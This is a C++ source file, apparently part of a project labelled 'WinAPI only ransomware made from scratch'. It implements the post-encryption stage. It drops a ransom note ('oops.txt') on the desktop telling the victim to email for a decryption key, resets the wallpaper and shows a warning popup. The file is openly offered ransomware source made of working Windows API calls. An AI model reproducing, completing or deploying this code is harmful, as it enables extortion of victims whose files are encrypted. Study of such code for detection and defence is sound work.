/*
   ############################################
   # Copyright 2023 Panagiotis (MalwarePad)   #
   # WinAPI only ransomware made from scratch #
   ############################################
*/

#include "PostEncryption.h"

std::string oopsText = "Oops! All of your personal files were encrypted...\n\nTo decrypt them, re-run the file with the private key we send to you!\n\nOur email: xyz@example.com";
const LPCWSTR finalPopup = L"All of your personal files have been encrypted! Check a file on your desktop for instructions on how to recover them!";

void dropDesktopFiles() {
	static char desktopPath[MAX_PATH + 1];
	if (!SHGetSpecialFolderPathA(HWND_DESKTOP, desktopPath, CSIDL_DESKTOP, FALSE)) return;

	std::string oopsFilePath = (std::string)desktopPath + "\\oops.txt";

	HANDLE hInfoFile = CreateFileA(oopsFilePath.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hInfoFile == INVALID_HANDLE_VALUE) return;

	DWORD bytesWritten;
	WriteFile(hInfoFile, oopsText.c_str(), oopsText.size(), &bytesWritten, NULL);

	CloseHandle(hInfoFile);
}

void changeWallpaper() {
	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, NULL, SPIF_UPDATEINIFILE);
}

void finalMessageBox() {
	MessageBox(NULL, finalPopup, L"Oops!", MB_ICONWARNING);
}
